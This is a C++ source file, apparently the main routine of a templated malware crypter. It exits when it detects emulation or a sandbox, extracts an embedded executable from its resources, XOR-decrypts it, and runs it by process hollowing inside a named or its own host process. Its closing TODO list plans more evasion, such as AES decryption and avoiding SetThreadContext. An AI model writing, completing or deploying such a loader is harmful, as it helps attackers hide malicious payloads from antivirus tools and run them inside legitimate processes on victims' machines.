#include "antivirusChecks.h"
#include "decrypt.h"
#include "processHollower.h"
#include "resource.h"

#define {{ cookiecutter.target_exe_type}}

int main() {
    if (isCodeEmulated() || isSandBox()) {
#ifndef NDEBUG
        system("pause");
#endif
        return 0;
    }
    HRSRC hResource = FindResource(nullptr, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    DWORD dwResourceSize = SizeofResource(nullptr, hResource);
    HGLOBAL hResourceData = LoadResource(nullptr, hResource);
    PVOID pResourceData = LockResource(hResourceData);
    char* lpGuestPEData = new char[dwResourceSize];
    CopyMemory(lpGuestPEData, pResourceData, dwResourceSize);

    Xor(lpGuestPEData, dwResourceSize, RESOURCE_KEY, RESOURCE_KEY_LENGTH);

    ProcessHollower PHollower;

#ifdef TARGET_TYPE_SELF
    char lpHostApplicationName[ MAX_PATH ];
    GetModuleFileName(nullptr, lpHostApplicationName, MAX_PATH+1);
#else
    char lpHostApplicationName[] = R"({{ cookiecutter.target_exe }})";
#endif

    if (!PHollower.execute(lpHostApplicationName, lpGuestPEData)) {
    #ifndef NDEBUG
        system("pause");
    #endif
        return -1;
    }
#ifndef NDEBUG
    system("pause");
#endif
    return 0;
}

/** TODO:
 * + Clean code
 * + Load resource
 * + Process IAT
 * + Memory permissions (not everything RWX)
 * + 64 bits
 * + Debug messages
 * - Try allocation at injected PE BaseAddress (modify PEB), if it fails try as now
 * - Force GUI if target is GUI
 * - AES decryption
 * - Other methods: avoid SetThreadContext, etc.
 */